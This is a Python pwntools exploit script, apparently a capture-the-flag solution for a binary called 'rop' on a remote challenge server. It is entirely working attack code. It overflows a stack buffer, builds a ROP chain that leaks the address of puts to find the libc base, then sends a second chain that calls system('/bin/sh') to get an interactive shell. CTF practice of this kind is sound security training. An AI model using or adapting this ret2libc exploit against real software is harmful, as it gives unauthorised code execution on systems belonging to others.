from pwn import * 
import requests

#context.log_level = 'debug'
context.binary = ELF('./rop')

r = remote('challenges.ctfd.io', 30261)

'''def GetLibC(puts):
    req = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
    libc_url = req.json()[0]['download_url']
    libc_file = libc_url.split('/')[-1:][0]

    if (not os.path.exists(libc_file)):
        req = requests.get(libc_url, allow_redirects=True)
        open(libc_file, 'wb').write(req.content)

    libc = ELF(libc_file)
    return libc'''


pop3 = p64(0x4011fe) # pop r13 ; pop r14 ; pop r15 ; ret
pop_rdi = p64(0x401203) #pop rdi;


payload = b'A' * 0x30 #buffer 
payload += b'B' * 0x8 #overwrite rbp

payload += pop_rdi #leak libc
payload += p64(context.binary.got.puts)
payload += p64(context.binary.plt.puts)
payload += p64(context.binary.sym.main) #return to main

r.recvline() #?\n
r.sendline(payload)

putsAddr = u64(r.recv() + b'\x00\x00')
print('puts: ' + hex(putsAddr))

#libc = GetLibC(putsAddr) #Set libc
libc = ELF('./libc6_2.32-0ubuntu3_amd64.so')
libc.address = putsAddr - libc.sym.puts
print('libc: ' + hex(libc.address))

r.recvline() #\n
r.recvline() #?\n

#repeat overflow
payload = b'A' * 0x30
payload += b'B' * 0x8
payload += p64(0x4011fe + 6) #alignment
payload += pop_rdi
payload += p64(libc.search(b'/bin/sh\x00').__next__()) #call system('/bin/bash\x00')
payload += p64(libc.sym.system)

r.sendline(payload)

r.interactive()
